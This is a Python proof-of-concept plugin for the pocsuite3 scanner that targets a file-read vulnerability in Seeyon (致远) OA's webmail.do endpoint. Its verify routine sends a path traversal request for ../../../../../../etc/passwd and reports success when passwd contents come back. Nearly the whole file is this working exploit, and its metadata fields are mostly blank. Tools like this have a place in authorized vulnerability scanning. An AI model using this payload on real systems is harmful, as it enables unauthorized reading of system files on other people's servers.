#!/usr/bin/env python
# coding: utf-8
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''致远OA webmail.do文件读取漏洞'''
    desc = ''''''
    solution = ''''''
    severity = '''medium'''
    vulType = '''file-download'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = '''致远OA'''
    appVersion = '''致远OA'''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _attack(self):
        return self._verify()

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        vul_url = make_verify_url(self.url, '/seeyon/webmail.do?method=doDownloadAtt&filename=passwd&filePath=../../../../../../etc/passwd', mod=0)
        resp = requests.get(vul_url, timeout=15, allow_redirects=False, verify=False)
        if resp.status_code == 200 and b'root:' in resp.content and b'nobody:x:' in resp.content and b'bin/' in resp.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['port'] = port
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if not result:
            result = 'Failed'

        if isinstance(result, dict):
            output.success(result)
        else:
            output.fail(result)
        return output


register_poc(TestPOC)
